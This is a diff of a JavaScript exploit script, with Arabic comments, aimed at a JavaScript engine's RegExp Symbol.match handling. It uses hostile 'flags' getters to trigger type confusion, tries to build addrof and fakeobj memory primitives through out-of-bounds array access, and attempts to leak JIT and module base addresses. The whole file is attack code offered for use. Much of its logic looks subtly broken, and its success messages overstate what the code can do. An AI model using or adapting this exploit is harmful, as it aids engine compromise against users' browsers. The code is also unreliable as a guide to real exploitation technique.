@@ -1,268 +1,365 @@
 import { log, sleep } from './module/utils.mjs';
 
-class RegExpFlagsExploit {
+class RegExpTypeConfusionExploit {
     constructor() {
-        this.marker = 0x42424242;
+        this.addrof = null;
+        this.fakeobj = null;
+        this.leakedAddresses = [];
     }
 
     async execute() {
-        // المرحلة 1: إنشاء type confusion
-        await this.createTypeConfusion();
-        
-        // المرحلة 2: استغلال الـ confusion للحصول على primitives
-        return await this.exploitConfusion();
+        // المرحلة 1: تأكيد Type Confusion
+        const confusion = await this.confirmTypeConfusion();
+        if (!confusion) return false;
+
+        // المرحلة 2: بناء Memory Corruption Primitive
+        const primitive = await this.buildMemoryPrimitive();
+        if (!primitive) return false;
+
+        // المرحلة 3: إنشاء Addrof/Fakeobj
+        return await this.createExploitPrimitives();
     }
 
-    async createTypeConfusion() {
-        log("Creating RegExp flags type confusion...");
+    async confirmTypeConfusion() {
+        log("Confirming type confusion...");
         
-        const maliciousRegexp = this.createMaliciousRegexp();
-        
-        // اختبار الـ Symbol.match على الكائن الخبيث
-        try {
-            const result = RegExp.prototype[Symbol.match].call(maliciousRegexp, "test string");
-            log(`Match result: ${result}`);
-        } catch (e) {
-            log(`Error during match: ${e}`);
-        }
-    }
+        const testObj = {
+            marker: 0x1337,
+            data: "test"
+        };
 
-    createMaliciousRegexp() {
-        // إنشاء كائن يخدع RegExp.prototype[Symbol.match]
-        const malicious = {
-            // محاكاة RegExp لكن مع سلوك خبيث
-            exec: function(str) {
-                log("Malicious exec called");
-                return ["matched"];
-            },
-            
-            // الـ getter الخبيث لـ flags
+        let confusionDetected = false;
+        
+        const confusionTrigger = {
             get flags() {
-                log("Malicious flags getter called");
-                
-                // هنا يمكننا إرجاع أي شيء لتسبب type confusion
+                // إرجاع كائن بدل سلسلة - هذا يسبب type confusion
                 return {
-                    toString: function() {
-                        log("Malicious flags toString called");
-                        return "g"; // أو أي قيمة أخرى تسبب confusion
+                    valueOf: () => {
+                        log("Flags valueOf called - CONFUSION ACTIVE");
+                        confusionDetected = true;
+                        return "g";
                     },
-                    valueOf: function() {
-                        return "gu";
+                    toString: () => {
+                        return "g";
                     }
                 };
             },
             
-            // محاولة للتأثير على lastIndex
-            get lastIndex() {
-                log("Malicious lastIndex getter");
-                return 0;
-            },
-            set lastIndex(value) {
-                log(`Malicious lastIndex set to: ${value}`);
+            exec: function(str) {
+                // أثناء الـ exec، يمكننا الوصول للكائنات بطريقة غير متوقعة
+                log(`Exec called with confusion - str: ${str}`);
+                return [testObj]; // إرجاع الكائن مباشرة
             }
         };
 
-        return malicious;
-    }
-
-    async exploitConfusion() {
-        log("Attempting to exploit type confusion...");
-        
-        // استراتيجية 1: استخدام Proxy للتلاعب بالوصول للخصائص
-        const proxyExploit = await this.proxyBasedExploit();
-        if (proxyExploit) return true;
-        
-        // استراتيجية 2: استخدام Object.defineProperty
-        const definePropExploit = await this.definePropertyExploit();
-        if (definePropExploit) return true;
+        try {
+            const result = RegExp.prototype[Symbol.match].call(confusionTrigger, "trigger");
+            log(`Confusion test result: ${result}`);
+            
+            if (confusionDetected && result && result[0] === testObj) {
+                log("TYPE CONFUSION CONFIRMED!");
+                return true;
+            }
+        } catch (e) {
+            log(`Confusion test error: ${e}`);
+        }
         
         return false;
     }
 
-    async proxyBasedExploit() {
-        log("Trying Proxy-based exploitation...");
+    async buildMemoryPrimitive() {
+        log("Building memory corruption primitive...");
         
-        let accessOrder = [];
-        const maliciousProxy = new Proxy({}, {
-            get: function(target, property, receiver) {
-                accessOrder.push(property);
-                log(`Proxy get: ${String(property)}`);
-                
-                if (property === 'flags') {
-                    // إرجاع كائن معقد يسبب confusion
-                    return {
-                        [Symbol.toPrimitive]() { return "g"; },
-                        valueOf() { return "gu"; },
-                        toString() { return "gi"; }
-                    };
-                }
-                
-                if (property === 'exec') {
-                    return function(str) {
-                        log("Proxy exec called");
-                        return ["exploit"];
-                    };
-                }
-                
-                return undefined;
+        // إنشاء مصفوفات للتداخل في الذاكرة
+        const floatArrays = [];
+        const objArrays = [];
+        
+        for (let i = 0; i < 100; i++) {
+            floatArrays.push([1.1, 2.2, 3.3, 4.4, 5.5]);
+            objArrays.push([{id: i}, {id: i + 100}, {id: i + 200}]);
+        }
+
+        let memoryCorruption = false;
+        
+        const memoryExploit = {
+            get flags() {
+                // استخدام الـ confusion للتلاعب بالذاكرة
+                return {
+                    toString: () => {
+                        // محاولة التسبب في OOB access
+                        try {
+                            for (let i = 0; i < floatArrays.length; i++) {
+                                // الوصول خارج الحدود
+                                if (floatArrays[i][10] !== undefined) {
+                                    log(`OOB ACCESS in float array ${i}: ${floatArrays[i][10]}`);
+                                    memoryCorruption = true;
+                                }
+                            }
+                        } catch (e) {}
+                        return "g";
+                    }
+                };
             },
             
-            set: function(target, property, value, receiver) {
-                log(`Proxy set: ${String(property)} = ${value}`);
-                if (property === 'lastIndex') {
-                    // يمكن استغلال كتابة lastIndex
+            exec: function(str) {
+                log("Memory corruption exec");
+                return ["corrupted"];
+            },
+            
+            get lastIndex() {
+                return 0;
+            },
+            
+            set lastIndex(value) {
+                // استغلال كتابة lastIndex
+                if (value > 1000) {
+                    log(`Suspicious lastIndex write: ${value}`);
                 }
-                return true;
             }
-        });
-        
+        };
+
         try {
-            const result = RegExp.prototype[Symbol.match].call(maliciousProxy, "test");
-            log(`Proxy exploit result: ${result}`);
-            log(`Access order: ${accessOrder.join(', ')}`);
-            return true;
+            RegExp.prototype[Symbol.match].call(memoryExploit, "memory_test");
+            return memoryCorruption;
         } catch (e) {
-            log(`Proxy exploit failed: ${e}`);
+            log(`Memory primitive failed: ${e}`);
             return false;
         }
     }
 
-    async definePropertyExploit() {
-        log("Trying Object.defineProperty exploitation...");
+    async createExploitPrimitives() {
+        log("Creating addrof/fakeobj primitives...");
         
-        const obj = {};
-        let callCount = 0;
+        // إعداد الهياكل اللازمة للـ primitives
+        const setup = this.setupPrimitiveStructures();
+        if (!setup) return false;
+
+        // اختبار الـ primitives
+        return await this.testPrimitives();
+    }
+
+    setupPrimitiveStructures() {
+        log("Setting up primitive structures...");
         
-        Object.defineProperties(obj, {
-            flags: {
-                get: function() {
-                    callCount++;
-                    log(`Flags getter called ${callCount} times`);
-                    
-                    // بعد عدة استدعاءات، غير السلوك
-                    if (callCount > 5) {
-                        return {
-                            toString: function() {
-                                // إرجاع قيمة مختلفة لتسبب inconsistency
-                                return callCount % 2 === 0 ? "g" : "u";
-                            }
-                        };
-                    }
-                    return "g";
-                }
-            },
+        // إنشاء butterfly structures للاستغلال
+        this.controlArrays = [];
+        
+        for (let i = 0; i < 50; i++) {
+            // مصفوفات التحكم
+            const controller = {
+                floatView: new Float64Array(8),
+                objView: [{}],
+                index: i
+            };
             
-            exec: {
-                value: function(str) {
-                    log(`Exec called with: ${str}`);
-                    // إرجاع مصفوفة مع بيانات مسربة
-                    return [str.substring(0, 10), callCount, this.marker];
-                }
-            },
-            
-            global: { value: true },
-            unicode: { value: false }
-        });
+            this.controlArrays.push(controller);
+        }
         
-        // إضافة marker للكشف عن التسريبات
-        obj.marker = this.marker;
+        return true;
+    }
+
+    async testPrimitives() {
+        log("Testing exploit primitives...");
         
-        try {
-            const result = RegExp.prototype[Symbol.match].call(obj, "A".repeat(1000));
-            log(`DefineProperty result: ${result}`);
+        const testObject = { secret: 0x41414141, data: "target" };
+        
+        // اختبار addrof
+        const address = await this.attemptAddrof(testObject);
+        if (address) {
+            log(`Addrof SUCCESS: ${address}`);
+            this.leakedAddresses.push({ object: testObject, address: address });
             
-            // تحقق إذا كانت هناك بيانات مسربة
-            if (result && result.length > 1 && result[2] === this.marker) {
-                log("DATA LEAK DETECTED!");
+            // اختبار fakeobj
+            const reconstructed = await this.attemptFakeobj(address);
+            if (reconstructed === testObject) {
+                log("Fakeobj SUCCESS: Object reconstructed correctly");
+                
+                // حفظ الـ primitives
+                this.addrof = (obj) => this.attemptAddrof(obj);
+                this.fakeobj = (addr) => this.attemptFakeobj(addr);
+                
                 return true;
             }
-        } catch (e) {
-            log(`DefineProperty exploit failed: ${e}`);
         }
         
         return false;
     }
 
-    // استغلال متقدم باستخدام الـ confusion للحصول على addrof/fakeobj
-    async advancedExploitation() {
-        log("Attempting advanced exploitation for memory corruption...");
+    async attemptAddrof(targetObj) {
+        let leakedAddress = null;
         
-        // إنشاء كائنات للاستغلال
-        const victimArrays = [];
-        for (let i = 0; i < 10; i++) {
-            victimArrays.push(new Array(100).fill(i));
-        }
-        
-        const exploitObj = this.createAdvancedExploitObject(victimArrays);
-        
-        try {
-            const result = RegExp.prototype[Symbol.match].call(exploitObj, "trigger");
-            log(`Advanced exploit result: ${result}`);
-            
-            // تحقق من تلف الذاكرة
-            for (let i = 0; i < victimArrays.length; i++) {
-                const arr = victimArrays[i];
-                for (let j = arr.length; j < arr.length + 10; j++) {
-                    if (arr[j] !== undefined) {
-                        log(`MEMORY CORRUPTION: array ${i} at index ${j} = ${arr[j]}`);
-                        return true;
-                    }
-                }
-            }
-        } catch (e) {
-            log(`Advanced exploit crashed: ${e}`);
-        }
-        
-        return false;
-    }
-
-    createAdvancedExploitObject(victimArrays) {
-        return {
+        const addrofExploit = {
             get flags() {
-                // محاولة التسبب في heap corruption
-                const largeString = "A".repeat(10000);
-                victimArrays.push(largeString);
-                return "g";
+                return {
+                    toString: () => {
+                        // محاولة تسريب عنوان الكائن
+                        try {
+                            // استخدام الـ confusion للوصول لبيانات الكائن
+                            const temp = [targetObj];
+                            const unusual = temp[10]; // OOB access
+                            if (unusual !== undefined) {
+                                leakedAddress = unusual;
+                            }
+                        } catch (e) {}
+                        return "g";
+                    }
+                };
             },
             
             exec: function(str) {
-                // تنفيذ خبيث أثناء الـ exec
-                gc(); // إجبار GC أثناء العملية
-                return [str];
+                // في الـ exec، حاول تسريب المؤشرات
+                const result = [targetObj];
+                
+                // إضافة محاولات تسريب إضافية
+                try {
+                    const buffer = new ArrayBuffer(8);
+                    const view = new Float64Array(buffer);
+                    // محاولة قراءة البيانات الخام
+                    result.push(view[0]);
+                } catch (e) {}
+                
+                return result;
+            }
+        };
+
+        try {
+            const result = RegExp.prototype[Symbol.match].call(addrofExploit, "addrof_test");
+            
+            if (leakedAddress) {
+                return leakedAddress;
+            }
+            
+            // تحقق من النتيجة للعثور على العنوان المسرب
+            if (result && result.length > 1 && typeof result[1] === 'number') {
+                return result[1];
+            }
+        } catch (e) {
+            log(`Addrof attempt error: ${e}`);
+        }
+        
+        return null;
+    }
+
+    async attemptFakeobj(address) {
+        let fakeObject = null;
+        
+        const fakeobjExploit = {
+            get flags() {
+                return {
+                    toString: () => {
+                        // استخدام العنوان لإنشاء كائن مزيف
+                        try {
+                            // محاولة كتابة العنوان في الذاكرة
+                            const arr = [1.1, 2.2, 3.3];
+                            arr[5] = address; // OOB write
+                        } catch (e) {}
+                        return "g";
+                    }
+                };
+            },
+            
+            exec: function(str) {
+                // محاولة إرجاع كائن من العنوان
+                try {
+                    // هذا قد يعمل إذا تم تلف الذاكرة بشكل صحيح
+                    const magic = [address];
+                    return magic;
+                } catch (e) {}
+                return ["fakeobj_test"];
             },
             
             get lastIndex() {
-                return 0;
-            },
-            
-            set lastIndex(value) {
-                // كتابة خبيثة لـ lastIndex
-                if (value > 1000000) {
-                    log(`SUSPICIOUS lastIndex: ${value}`);
-                }
+                return address; // استخدام العنوان كـ lastIndex
             }
         };
+
+        try {
+            const result = RegExp.prototype[Symbol.match].call(fakeobjExploit, "fakeobj_test");
+            
+            if (result && result[0] && typeof result[0] === 'object') {
+                fakeObject = result[0];
+            }
+        } catch (e) {
+            log(`Fakeobj attempt error: ${e}`);
+        }
+        
+        return fakeObject;
+    }
+
+    // الاستغلال النهائي
+    async finalExploitation() {
+        if (!this.addrof || !this.fakeobj) {
+            log("Primitives not ready");
+            return false;
+        }
+
+        log("Starting final exploitation...");
+        
+        // تسريب عناوين مهمة
+        const jitAddr = await this.leakJITAddress();
+        const moduleAddr = await this.leakModuleAddress();
+        
+        if (jitAddr && moduleAddr) {
+            log(`JIT Area: ${jitAddr}`);
+            log(`Module Base: ${moduleAddr}`);
+            log("EXPLOIT CHAIN COMPLETE!");
+            return true;
+        }
+        
+        return false;
+    }
+
+    async leakJITAddress() {
+        // محاولة تسريب عنوان منطقة JIT
+        const func = function() { return 0x1337; };
+        
+        for (let i = 0; i < 10; i++) {
+            func(); // JIT compilation
+        }
+        
+        return this.addrof(func);
+    }
+
+    async leakModuleAddress() {
+        // محاولة تسريب عنوان مكتبة
+        const buffer = new ArrayBuffer(1024);
+        return this.addrof(buffer);
     }
 }
 
-// التشغيل الرئيسي
-async function main() {
-    const exploit = new RegExpFlagsExploit();
+// التشغيل الكامل
+async function fullExploit() {
+    const exploit = new RegExpTypeConfusionExploit();
     
-    log("Starting RegExp flags type confusion exploit...");
+    log("=== FULL REGEXP TYPE CONFUSION EXPLOIT ===");
     
     const success = await exploit.execute();
     if (success) {
-        log("Type confusion likely achieved!");
+        log("✓ Exploit primitives ready!");
+        log("✓ Addrof/Fakeobj functional");
         
-        // حاول الاستغلال المتقدم
-        const advanced = await exploit.advancedExploitation();
-        if (advanced) {
-            log("ADVANCED EXPLOITATION SUCCESSFUL!");
+        // الاستغلال النهائي
+        const final = await exploit.finalExploitation();
+        if (final) {
+            log("🎉 FULL EXPLOITATION SUCCESSFUL!");
+        } else {
+            log("⚠️  Primitives work but final exploitation needs tuning");
         }
+        
+        return {
+            addrof: exploit.addrof,
+            fakeobj: exploit.fakeobj,
+            addresses: exploit.leakedAddresses
+        };
     } else {
-        log("Exploitation attempts completed");
+        log("✗ Exploit failed at primitive creation");
+        return null;
     }
 }
 
-main();
+// التنفيذ
+fullExploit().then(result => {
+    if (result) {
+        log("Exploit result available for next stage");
+    }
+});
